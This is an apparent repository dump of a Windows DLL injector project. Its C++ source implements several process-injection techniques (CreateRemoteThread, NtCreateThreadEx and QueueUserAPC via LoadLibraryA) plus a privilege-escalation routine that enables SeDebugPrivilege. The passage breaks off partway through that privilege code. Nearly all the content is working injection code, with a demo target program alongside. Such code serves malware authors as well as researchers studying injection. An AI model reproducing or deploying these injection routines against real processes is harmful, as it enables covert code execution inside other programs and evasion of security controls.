Project Path: arc_gmh5225_Windows-DLL-Injector_easy68ml

Source Tree:

```txt
arc_gmh5225_Windows-DLL-Injector_easy68ml
├── Injector
│   ├── Injector.vcxproj
│   ├── Injector.vcxproj.filters
│   ├── Injector.vcxproj.user
│   └── src
│       ├── CreateRemoteThread.cpp
│       ├── GetOperatingSystemInfo.cpp
│       ├── Injector.cpp
│       ├── Injector.h
│       ├── NtCreateThreadEx.cpp
│       ├── QueueUserAPC.cpp
│       ├── RaiseToSystemLevel.cpp
│       ├── RtlCreateUserThread.cpp
│       └── SetWindowsHookEx.cpp
├── PayloadDLL
│   ├── PayloadDLL.vcxproj
│   ├── PayloadDLL.vcxproj.filters
│   ├── PayloadDLL.vcxproj.user
│   └── src
│       ├── Payload.cpp
│       └── Payload.h
├── README.md
├── TargetProgram
│   ├── TargetProgram.vcxproj
│   ├── TargetProgram.vcxproj.filters
│   ├── TargetProgram.vcxproj.user
│   └── src
│       └── Target.cpp
└── WindowsDLLInjector.sln

```

`Injector/Injector.vcxproj`:

```vcxproj
<?xml version="1.0" encoding="utf-8"?>
<Project DefaultTargets="Build" ToolsVersion="15.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup Label="ProjectConfigurations">
    <ProjectConfiguration Include="Debug|Win32">
      <Configuration>Debug</Configuration>
      <Platform>Win32</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release|Win32">
      <Configuration>Release</Configuration>
      <Platform>Win32</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Debug|x64">
      <Configuration>Debug</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release|x64">
      <Configuration>Release</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
  </ItemGroup>
  <PropertyGroup Label="Globals">
    <VCProjectVersion>15.0</VCProjectVersion>
    <ProjectGuid>{88F889C8-1CE7-4E52-AB34-1270B6B92514}</ProjectGuid>
    <RootNamespace>SimpleDllInjector</RootNamespace>
    <WindowsTargetPlatformVersion>10.0.17763.0</WindowsTargetPlatformVersion>
    <ProjectName>Injector</ProjectName>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.Default.props" />
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>true</UseDebugLibraries>
    <PlatformToolset>v141</PlatformToolset>
    <CharacterSet>MultiByte</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>v141</PlatformToolset>
    <WholeProgramOptimization>true</WholeProgramOptimization>
    <CharacterSet>MultiByte</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>true</UseDebugLibraries>
    <PlatformToolset>v141</PlatformToolset>
    <CharacterSet>MultiByte</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>v141</PlatformToolset>
    <WholeProgramOptimization>true</WholeProgramOptimization>
    <CharacterSet>MultiByte</CharacterSet>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.props" />
  <ImportGroup Label="ExtensionSettings">
  </ImportGroup>
  <ImportGroup Label="Shared">
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <PropertyGroup Label="UserMacros" />
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <OutDir>$(SolutionDir)InjectorBuild\bin\$(Configuration)\$(Platform)\</OutDir>
    <IntDir>$(SolutionDir)InjectorBuild\intermediates\$(Configuration)\$(Platform)\</IntDir>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <OutDir>$(SolutionDir)InjectorBuild\bin\$(Configuration)\$(Platform)\</OutDir>
    <IntDir>$(SolutionDir)InjectorBuild\intermediates\$(Configuration)\$(Platform)\</IntDir>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <OutDir>$(SolutionDir)InjectorBuild\bin\$(Configuration)\$(Platform)\</OutDir>
    <IntDir>$(SolutionDir)InjectorBuild\intermediates\$(Configuration)\$(Platform)\</IntDir>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <OutDir>$(SolutionDir)InjectorBuild\bin\$(Configuration)\$(Platform)\</OutDir>
    <IntDir>$(SolutionDir)InjectorBuild\intermediates\$(Configuration)\$(Platform)\</IntDir>
  </PropertyGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <Optimization>Disabled</Optimization>
      <SDLCheck>false</SDLCheck>
      <ConformanceMode>true</ConformanceMode>
      <PreprocessorDefinitions>_CRT_SECURE_NO_DEPRECATE;_MBCS;%(PreprocessorDefinitions)</PreprocessorDefinitions>
    </ClCompile>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <Optimization>Disabled</Optimization>
      <SDLCheck>false</SDLCheck>
      <ConformanceMode>true</ConformanceMode>
      <PreprocessorDefinitions>_CRT_SECURE_NO_DEPRECATE;_MBCS;%(PreprocessorDefinitions)</PreprocessorDefinitions>
    </ClCompile>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <Optimization>MaxSpeed</Optimization>
      <FunctionLevelLinking>true</FunctionLevelLinking>
      <IntrinsicFunctions>true</IntrinsicFunctions>
      <SDLCheck>false</SDLCheck>
      <ConformanceMode>true</ConformanceMode>
      <PreprocessorDefinitions>_CRT_SECURE_NO_DEPRECATE;_MBCS;%(PreprocessorDefinitions)</PreprocessorDefinitions>
    </ClCompile>
    <Link>
      <EnableCOMDATFolding>true</EnableCOMDATFolding>
      <OptimizeReferences>true</OptimizeReferences>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <Optimization>MaxSpeed</Optimization>
      <FunctionLevelLinking>true</FunctionLevelLinking>
      <IntrinsicFunctions>true</IntrinsicFunctions>
      <SDLCheck>false</SDLCheck>
      <ConformanceMode>true</ConformanceMode>
      <PreprocessorDefinitions>_CRT_SECURE_NO_DEPRECATE;_MBCS;%(PreprocessorDefinitions)</PreprocessorDefinitions>
    </ClCompile>
    <Link>
      <EnableCOMDATFolding>true</EnableCOMDATFolding>
      <OptimizeReferences>true</OptimizeReferences>
    </Link>
  </ItemDefinitionGroup>
  <ItemGroup>
    <ClCompile Include="src\CreateRemoteThread.cpp" />
    <ClCompile Include="src\RaiseToSystemLevel.cpp" />
    <ClCompile Include="src\GetOperatingSystemInfo.cpp" />
    <ClCompile Include="src\Injector.cpp" />
    <ClCompile Include="src\NtCreateThreadEx.cpp" />
    <ClCompile Include="src\QueueUserAPC.cpp" />
    <ClCompile Include="src\RtlCreateUserThread.cpp" />
    <ClCompile Include="src\SetWindowsHookEx.cpp" />
  </ItemGroup>
  <ItemGroup>
    <ClInclude Include="src\Injector.h" />
  </ItemGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.targets" />
  <ImportGroup Label="ExtensionTargets">
  </ImportGroup>
</Project>
```

`Injector/Injector.vcxproj.filters`:

```filters
<?xml version="1.0" encoding="utf-8"?>
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup>
    <Filter Include="Source Files">
      <UniqueIdentifier>{4FC737F1-C7A5-4376-A066-2A32D752A2FF}</UniqueIdentifier>
      <Extensions>cpp;c;cc;cxx;def;odl;idl;hpj;bat;asm;asmx</Extensions>
    </Filter>
    <Filter Include="Header Files">
      <UniqueIdentifier>{93995380-89BD-4b04-88EB-625FBE52EBFB}</UniqueIdentifier>
      <Extensions>h;hh;hpp;hxx;hm;inl;inc;ipp;xsd</Extensions>
    </Filter>
    <Filter Include="Resource Files">
      <UniqueIdentifier>{67DA6AB6-F800-4c08-8B7A-83BB121AAD01}</UniqueIdentifier>
      <Extensions>rc;ico;cur;bmp;dlg;rc2;rct;bin;rgs;gif;jpg;jpeg;jpe;resx;tiff;tif;png;wav;mfcribbon-ms</Extensions>
    </Filter>
  </ItemGroup>
  <ItemGroup>
    <ClCompile Include="src\Injector.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="src\CreateRemoteThread.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="src\NtCreateThreadEx.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="src\GetOperatingSystemInfo.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="src\QueueUserAPC.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="src\SetWindowsHookEx.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="src\RtlCreateUserThread.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="src\RaiseToSystemLevel.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
  </ItemGroup>
  <ItemGroup>
    <ClInclude Include="src\Injector.h">
      <Filter>Header Files</Filter>
    </ClInclude>
  </ItemGroup>
</Project>
```

`Injector/Injector.vcxproj.user`:

```user
<?xml version="1.0" encoding="utf-8"?>
<Project ToolsVersion="15.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <PropertyGroup>
    <ShowAllFiles>true</ShowAllFiles>
  </PropertyGroup>
</Project>
```

`Injector/src/CreateRemoteThread.cpp`:

```cpp
#include "Injector.h"

bool CreateRemoteThread_Type1(LPCSTR DllPath, HANDLE hProcess) {

	LPVOID LoadLibAddr = (LPVOID)GetProcAddress(GetModuleHandleA("kernel32.dll"), "LoadLibraryA");

	if (!LoadLibAddr) {
		printf("Could note locate real address of LoadLibraryA!\n");
		printf("LastError : 0X%x\n", GetLastError());
		system("PAUSE");
		return false;
	}

	printf("LoadLibraryA is located at real address: 0X%p\n", (void*)LoadLibAddr);
	Sleep(1000);

	LPVOID pDllPath = VirtualAllocEx(hProcess, 0, strlen(DllPath), MEM_COMMIT, PAGE_READWRITE);

	if (!pDllPath) {
		printf("Could not allocate Memory in target process\n");
		printf("LastError : 0X%x\n", GetLastError());
		system("PAUSE");
		return false;
	}

	printf("Dll path memory allocated at: 0X%p\n", (void*)pDllPath);
	Sleep(1000);

	BOOL Written = WriteProcessMemory(hProcess, pDllPath, (LPVOID)DllPath, strlen(DllPath), NULL);

	if (!Written) {
		printf("Could not write into the allocated memory\n");
		printf("LastError : 0X%x\n", GetLastError());
		system("PAUSE");
		return false;
	}

	printf("Dll path memory was written at address : 0x%p\n", (void*)pDllPath);
	Sleep(1000);

	HANDLE hThread = CreateRemoteThread(hProcess, NULL, NULL, (LPTHREAD_START_ROUTINE)LoadLibAddr, pDllPath, 0, NULL);

	if (!hThread) {
		printf("Could not open Thread with CreatRemoteThread API\n");
		printf("LastError : 0X%x\n", GetLastError());
		system("PAUSE");
		return false;
	}

	printf("Thread started with CreateRemoteThread\n");
	Sleep(1000);

	WaitForSingleObject(hThread, INFINITE);
	system("PAUSE");

	if (VirtualFreeEx(hProcess, pDllPath, 0, MEM_RELEASE)) {
		//VirtualFreeEx(hProc, reinterpret_cast<int*>(pDllPath) + 0X010000, 0, MEM_RELEASE);
		printf("Memory was freed in target process\n");
		Sleep(1000);
	}

	CloseHandle(hThread);

	return true;
}
```

`Injector/src/GetOperatingSystemInfo.cpp`:

```cpp
#include "Injector.h"

#define		WIN_NT_3_1		"Windows NT 3.1 (1993)"
#define		WIN_NT_3_5		"Windows NT 3.5 (1994)"
#define		WIN_NT_3_51		"Windows NT 3.51 (1995)"
#define		WIN_NT_4_0		"Windows NT 4.0 (1996)"
#define		WIN_NT_5_0		"Windows NT 5.0 (Windows 2000) (1997-1999)"
#define		WIN_NT_5_1		"Windows NT 5.1 (Windows XP) (2001)"
#define		WIN_NT_5_2		"Windows NT 5.2 (Windows Server 2003, Windows XP x64) (2003)"
#define		WIN_NT_6_0		"Windows NT 6.0 (Windows Vista, Windows Server 2008) (2006)"
#define		WIN_NT_6_1		"Windows NT 6.1 (Windows 7, Windows Server 2008 R2) (2009)"
#define		WIN_NT_6_2		"Windows NT 6.2 (Windows 8, Windows Server 2012) (2012)"
#define		WIN_NT_6_3		"Windows NT 6.3 (Windows 8.1, Windows Server 2012 R2) (2013)"
#define		WIN_NT_10		"Windows NT 10.0 (Windows 10, Windows Server 2016) (2015)"

bool GetOSInfo() {

	/*
	* Windows NT 3.1 (1993)
	* Windows NT 3.5 (1994)
	* Windows NT 3.51 (1995)
	* Windows NT 4.0 (1996)
	* Windows NT 5.0 (Windows 2000) (1997-1999)
	* Windows NT 5.1 (Windows XP) (2001)
	* Windows NT 5.2 (Windows Server 2003, Windows XP x64) (2003)
	* Windows NT 6.0 (Windows Vista, Windows Server 2008) (2006)
	* Windows NT 6.1 (Windows 7, Windows Server 2008 R2) (2009)
	* Windows NT 6.2 (Windows 8, Windows Server 2012) (2012)
	* Windows NT 6.3 (Windows 8.1, Windows Server 2012 R2) (2013)
	* Windows NT 10.0 (Windows 10, Windows Server 2016) (2015)
	*/

	printf("Determining Windows NT version and architecture...\n");

	bool is64bit;

	is64bit = (sizeof(void*) != 4);

	if (is64bit)
		printf("The architecture of OS : 64bit\n");
	else
		printf("The architecture of OS : 32bit\n");


	OSVERSIONINFO osVersion;
	
	ZeroMemory(&osVersion, sizeof(OSVERSIONINFO));
	osVersion.dwOSVersionInfoSize = sizeof(osVersion);
	
	if (GetVersionEx(&osVersion) && osVersion.dwPlatformId == 2) {
		
		switch (osVersion.dwMajorVersion){

			case 3:
				switch (osVersion.dwMinorVersion) {

					case 1:
						printf("%s\n", WIN_NT_3_1);
						return true;
					case 5:
						printf("%s\n", WIN_NT_3_5);
						return true;
					case 51:
						printf("%s\n", WIN_NT_3_51);
						return true;
				}
				break;


			case 4:
				switch (osVersion.dwMinorVersion) {
					case 0:
						printf("%s\n", WIN_NT_4_0);
						return true;
				}
				break;

			case 5:
				switch (osVersion.dwMinorVersion) {

					case 0:
						printf("%s\n", WIN_NT_5_0);
						return true;
					case 1:
						printf("%s\n", WIN_NT_5_1);
						return true;
					case 2:
						printf("%s\n", WIN_NT_5_2);
						return true;
				}
				break;

			case 6:
				switch (osVersion.dwMinorVersion) {

				case 0:
					printf("%s\n", WIN_NT_6_0);
					return true;
				case 1:
					printf("%s\n", WIN_NT_6_1);
					return true;
				case 2:
					printf("%s\n", WIN_NT_6_2);
					return true;
				case 3:
					printf("%s\n", WIN_NT_6_3);
					return true;
				}
				break;

			case 10:
				switch (osVersion.dwMinorVersion) {
					case 0:
						printf("%s\n", WIN_NT_10);
						return true;
				}
				break;
		}
	}
	
	return false;
}
```

`Injector/src/Injector.cpp`:

```cpp
#include "Injector.h"

#ifdef _WIN64
	LPCSTR DllPath = "C:\\Users\\PATH\\TO\\DLL_FILE";
#else
	LPCSTR DllPath = "C:\\Users\\PATH\\TO\\DLL_FILE";
#endif

// variables for Privilege Escalation
HANDLE hToken;
int dwRetVal = RTN_OK;

int main() {

	if (!GetOSInfo()) {
		printf("Failed to get Windows NT version\n");
		printf("LastError: 0x%x\n", GetLastError());
	}
	
	printf("escalating Privileges...\n");
	Sleep(2000);
	int epResult = EscalatePrivilege();
	printf("Result of Privilege Escalation : %d\n", epResult);

	if (epResult == RTN_OK)
		printf("Successfully Escalated privileges to SYSTEM level...\n");
	
	char szProc[80];

	printf("Target process name : ");
	scanf_s("%79s", szProc, 79);

	PROCESSENTRY32 PE32{ sizeof(PROCESSENTRY32) };
	PE32.dwSize = sizeof(PE32);

	HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hSnap == INVALID_HANDLE_VALUE) {
		printf("CreateToolhelp32Snapshot failed!");
		printf("LastError : 0x%x\n", GetLastError());
		system("PAUSE");
		return 0;
	}

	DWORD PID = 0;
	BOOL bRet = Process32First(hSnap, &PE32);
	char yn[3];

	while (bRet) {

		//printf("process: %s\n", PE32.szExeFile);
		if (!strcmp((LPCSTR)szProc, PE32.szExeFile)) {

			PID = PE32.th32ProcessID;
			printf("PID found for this process name ---> %d\n", PID);
			printf("Is this OK ? [Input Y to continue with this PID] : ");


			scanf_s("%2s", yn, 2);

			if ( !strcmp((LPCSTR)yn, "y") || !strcmp((LPCSTR)yn, "Y") )
				break;

			printf("\n\n");

		}

		bRet = Process32Next(hSnap, &PE32);
	}

	CloseHandle(hSnap);

	printf("Target Program PID: %d\n\n", PID);

	int InjectionMethod = -1;

	printf("\n\n");
	printf("   1) CreateRemoteThread\n");
	printf("   2) NtCreateThread\n");
	printf("   3) QueueUserAPC\n");
	printf("   4) SetWindowsHookEx\n");
	printf("   5) RtlCreateUserThread\n");
	printf("\n\n\n");
	printf("Enter the Injection method: ");
	scanf("%d", &InjectionMethod);

	HANDLE hProcess = OpenProcess(
		PROCESS_QUERY_INFORMATION |
		PROCESS_CREATE_THREAD |
		PROCESS_VM_OPERATION |
		PROCESS_VM_WRITE,
		FALSE, PID);	

	//HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);

	if (!hProcess) {
		printf("Could not open Process for PID %d\n", PID);
		printf("LastError : 0X%x\n", GetLastError());
		system("PAUSE");
		return false;
	}
	
	// disable SeDebugPrivilege
	SetPrivilege(hToken, SE_DEBUG_NAME, FALSE);

	// close handles
	CloseHandle(hToken);

	switch (InjectionMethod)
	{
		case 1:
			CreateRemoteThread_Type1(DllPath, hProcess);
			break;
		case 2:
			NtCreateThreadEx_Type2(DllPath, hProcess);
			break;
		case 3:
			QueueUserAPC_Type3(DllPath, hProcess, PID);
			break;
		case 4:
			SetWindowsHookEx_type4(PID, DllPath);
			break;
		case 5:
			RtlCreateUsreThread_type5(hProcess, DllPath);
			break;
		default:
			printf("Choose a valid mathod\n");
			break;
	}
	

	CloseHandle(hProcess);

	if (!TerminateProcess(hProcess, 0xffffffff))
	{
		DisplayError("TerminateProcess");
		dwRetVal = RTN_ERROR;
	}

	return 0;
}

```

`Injector/src/Injector.h`:

```h
#ifndef INJECTOR_H
#define INJECOTR_H

#define RTN_OK		0
#define RTN_USAGE	1
#define RTN_ERROR	13

#include <stdio.h>
#include <Windows.h>
#include <tlHelp32.h>


#define DEBUG_NTBUFFER

bool GetOSInfo();

// Escalate Privilege to SYSTEM level
bool SetPrivilege(HANDLE hToken, LPCTSTR Privilege, BOOL bEnablePrivilege);
void DisplayError(LPCSTR szAPI);
int EscalatePrivilege();

// tech 1 ---> CreateRemoteThread
bool CreateRemoteThread_Type1(LPCSTR DllPath, HANDLE hProcess);


// tech 2 ---> NtCreateThreadEx
bool NtCreateThreadEx_Type2(LPCSTR DllPath, HANDLE hProcess);

#ifdef DEBUG_NTBUFFER


// Unknown buffer structuew definition in NtCreateThread API
struct NtCreateThreadExBuffer
{
	SIZE_T	Size;
	SIZE_T	Unknown1;
	SIZE_T	Unknown2;
	PULONG	Unknown3;
	SIZE_T	Unknown4;
	SIZE_T	Unknown5;
	SIZE_T	Unknown6;
	PULONG	Unknown7;
	SIZE_T	Unknown8;
};

#endif


// NtCreateThreadEx header definition based on https://undocumented.ntinternals.net/
typedef NTSTATUS(WINAPI* lpNtCreateThreadEx)(

	OUT		PHANDLE				hThread,
	IN		ACCESS_MASK			DesiredAccess,
	IN		LPVOID				ObjectAttributes,
	IN		HANDLE				ProcessHandle,
	IN		LPVOID				lpStartAddress,
	IN		LPVOID				lpParameter,
	IN		ULONG				CreateSuspended,
	IN		SIZE_T				StackZeroBits,
	IN		SIZE_T				SizeOfStackCommit,
	IN		SIZE_T				SizeOfStackReserve,
	OUT		LPVOID				lpBytesBuffer
);


// tech 3 ---> QueueUserAPC
bool QueueUserAPC_Type3(LPCSTR DllPath, HANDLE hProcess, DWORD processId);


// tech 4 ---> SetWindowsHookEx
bool SetWindowsHookEx_type4(DWORD processId, LPCSTR dllPath);


// tech 5 ---> RtlCreatUserThread
bool RtlCreateUsreThread_type5(HANDLE hProcess, LPCSTR DllPath);


// RtlCreateUserThread header definition based on https://undocumented.ntinternals.net/
typedef DWORD(WINAPI* pRtlCreatUserThread)(

	IN		HANDLE					ProcessHandle,
	IN 		PSECURITY_DESCRIPTOR	SecurityDescriptor,
	IN		BOOLEAN					CreateSuspended,
	IN		ULONG					StackZeroBits,
	IN OUT	PULONG					StackReserved,
	IN OUT	PULONG					StackCommit,
	IN		PVOID					StartAddress,
	IN		PVOID					StartParameter,
	OUT		PHANDLE					ThreadHandle,
	OUT		PVOID					ClientID

);

#endif
```

`Injector/src/NtCreateThreadEx.cpp`:

```cpp
#include "Injector.h"

bool NtCreateThreadEx_Type2(LPCSTR DllPath, HANDLE hProcess) {


	LPVOID LoadLibraryAddr = (LPVOID)GetProcAddress(GetModuleHandleA("kernel32.dll"), "LoadLibraryA");

	if (!LoadLibraryAddr) {
		printf("Could note get real address of LoadLibraryA from kernel32.dll!\n");
		printf("LastError : 0X%x\n", GetLastError());
		system("PAUSE");
		return false;
	}

	printf("LoadLibraryA is located at real address: 0X%p\n", (void*)LoadLibraryAddr);
	Sleep(1000);
	//system("PAUSE");
	

	LPVOID pDllPath = VirtualAllocEx(hProcess, 0, strlen(DllPath), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

	if (!pDllPath) {
		printf("Could not allocate Memory in target process\n");
		printf("LastError : 0X%x\n", GetLastError());
		system("PAUSE");
		return false;
	}

	printf("Dll path memory allocated at: 0X%p\n", (void*)pDllPath);
	Sleep(1000);
	//system("PAUSE");
	

	BOOL Written = WriteProcessMemory(hProcess, pDllPath, (LPVOID)DllPath, strlen(DllPath), NULL);


	if (!Written) {
		printf("Could not write into the allocated memory\n");
		printf("LastError : 0X%x\n", GetLastError());
		system("PAUSE");
		return false;
	}

	printf("Dll path memory was written at address : 0x%p\n", (void*)pDllPath);
	Sleep(1000);
	//system("PAUSE");

	HMODULE modNtDll = GetModuleHandle("ntdll.dll");

	if (!modNtDll) {
		printf("Failed to get module handle for ntdll.dll\n");
		printf("LastError : 0X%x\n", GetLastError());
		system("PAUSE");
		return false;
	}

	lpNtCreateThreadEx funNtCreateThreadEx = (lpNtCreateThreadEx)GetProcAddress(modNtDll, "NtCreateThreadEx");

	if (!funNtCreateThreadEx) {
		printf("Failed to get NtCreateThreadEx function address from ntdll.dll\n");
		printf("LastError: 0X%x\n", GetLastError());
		system("PAUSE");
		return false;
	}

#ifdef DEBUG_NTBUFFER

	NtCreateThreadExBuffer ntBuffer;

	memset(&ntBuffer, 0, sizeof(NtCreateThreadExBuffer));
	ULONG temp0[2];
	ULONG temp1;

	ntBuffer.Size = sizeof(NtCreateThreadExBuffer);
	ntBuffer.Unknown1 = 0x10003;
	ntBuffer.Unknown2 = sizeof(temp0);
	ntBuffer.Unknown3 = temp0;
	ntBuffer.Unknown4 = 0;
	ntBuffer.Unknown5 = 0x10004;
	ntBuffer.Unknown6 = sizeof(temp1);
	ntBuffer.Unknown7 = &temp1;
	ntBuffer.Unknown8 = 0;
#endif

	HANDLE hThread = nullptr;

	NTSTATUS status = funNtCreateThreadEx(
		&hThread,
		THREAD_ALL_ACCESS,
		nullptr,
		hProcess,
		(LPTHREAD_START_ROUTINE)LoadLibraryAddr,
		pDllPath,
		NULL, //start instantly
		0,
		0,
		0,
		nullptr
	);

	if (!hThread) {
		printf("\nNtCreateThreadEx failed\n");
		printf("LastError: 0X%x\n", GetLastError());
		if (VirtualFreeEx(hProcess, pDllPath, 0, MEM_RELEASE)) {
			//VirtualFreeEx(hProc, reinterpret_cast<int*>(pDllPath) + 0X010000, 0, MEM_RELEASE);
			printf("Memory was freed in target process\n");
			Sleep(1000);
		}
		system("PAUSE");
		return false;
	}

	printf("Thread started with NtCreateThread\n");
	Sleep(1000);

	WaitForSingleObject(hThread, INFINITE);

	system("PAUSE");

	if (VirtualFreeEx(hProcess, pDllPath, 0, MEM_RELEASE)) {
		printf("Memory was freed in target process\n");
		Sleep(1000);
	}

	CloseHandle(hThread);

	CloseHandle(hProcess);

	return true;
}
```

`Injector/src/QueueUserAPC.cpp`:

```cpp
#include "Injector.h"

bool QueueUserAPC_Type3(LPCSTR DllPath, HANDLE hProcess, DWORD processId) {

	LPVOID LoadLibAddr = GetProcAddress(GetModuleHandleA("kernel32.dll"), "LoadLibraryA");

	if (!LoadLibAddr) {
		printf("Could note locate real address of LoadLibraryA!\n");
		printf("LastError : 0X%x\n", GetLastError());
		system("PAUSE");
		return false;
	}

	printf("LoadLibraryA is located at real address: 0X%p\n", (void*)LoadLibAddr);
	Sleep(1000);

	LPVOID pDllPath = VirtualAllocEx(hProcess, 0, strlen(DllPath), MEM_COMMIT, PAGE_READWRITE);

	if (!pDllPath) {
		printf("Could not allocate Memory in target process\n");
		printf("LastError : 0X%x\n", GetLastError());
		system("PAUSE");
		return false;
	}

	printf("Dll path memory allocated at: 0X%p\n", (void*)pDllPath);
	Sleep(1000);


	BOOL Written = WriteProcessMemory(hProcess, pDllPath, LPVOID(DllPath), strlen(DllPath), NULL);

	if (!Written) {
		printf("Could not write into the allocated memory\n");
		printf("LastError : 0X%x\n", GetLastError());
		system("PAUSE");
		return false;
	}

	printf("Dll path memory was written at address : 0x%p\n", (void*)pDllPath);
	Sleep(1000);

	HANDLE hThreadSnap = INVALID_HANDLE_VALUE;
	THREADENTRY32 te32;

	// Take snaphsot of all running threads
	hThreadSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);

	if (hThreadSnap == INVALID_HANDLE_VALUE) {
		printf("Could not get snapshot of threads\n");
		printf("LastError : 0X%x\n", GetLastError());
		system("PAUSE");
		return false;
	}

	// set structure size
	te32.dwSize = sizeof(THREADENTRY32);
	DWORD threadId;

	if (!Thread32First(hThreadSnap, &te32)) {
		printf("Could not get first thread\n");
		printf("LastError : 0X%x\n", GetLastError());
		system("PAUSE");
		return false;
	}

	do {

		if (te32.th32OwnerProcessID == processId) {

			threadId = te32.th32ThreadID;
			printf("Exploitng thread with ID %d", threadId);
			HANDLE hThread = OpenThread(THREAD_SET_CONTEXT, FALSE, threadId);

			if (hThread) {

				printf("Thread %d is opened succesfully\n", threadId);
				Sleep(1000);
				DWORD dwResult = QueueUserAPC((PAPCFUNC)LoadLibAddr, hThread, (ULONG_PTR)pDllPath);

				if (dwResult) {
					printf("Payload Injected successfully in thread %d\n", threadId);
					system("PAUSE");
					return true;
				}
				else
				{
					printf("Error in calling QueueUSerAPC() for thread %d!... Continuing to try other threads\n", threadId);
					system("PAUSE");
				}

			}
			else {
				printf("Error in Getting found thread ID\n");
				printf("LastError : 0X%x\n", GetLastError());
				system("PAUSE");
				return false;
			}
		}

	} while (Thread32Next(hThreadSnap, &te32));

	if (!threadId)
		printf("No Thread for use in process %d\n", processId);

	CloseHandle(hThreadSnap);

	return false;

}
```

`Injector/src/RaiseToSystemLevel.cpp`:

```cpp
#include "injector.h"

bool SetPrivilege(HANDLE hToken, LPCTSTR Privilege, BOOL bEnablePrivilege) {

	TOKEN_PRIVILEGES tp;
	LUID luid;
	TOKEN_PRIVILEGES tpPrevious;
	DWORD cbPrevious = sizeof(TOKEN_PRIVILEGES);

	if (!LookupPrivilegeValue(NULL, Privilege, &luid)) return false;

	// First pass. get current privilege settings
	tp.PrivilegeCount = 1;
	tp.Privileges[0].Luid = luid;
	tp.Privileges[0].Attributes = 0;

	AdjustTokenPrivileges(
		hToken,
		FALSE,
		&tp,
		sizeof(TOKEN_PRIVILEGES),
		&tpPrevious,
		&cbPrevious);

	if (GetLastError() != ERROR_SUCCESS) return false;

	// second pass. set privileges based on previous settings

	tpPrevious.PrivilegeCount = 1;
	tpPrevious.Privileges[0].Luid = luid;

	if (bEnablePrivilege) {
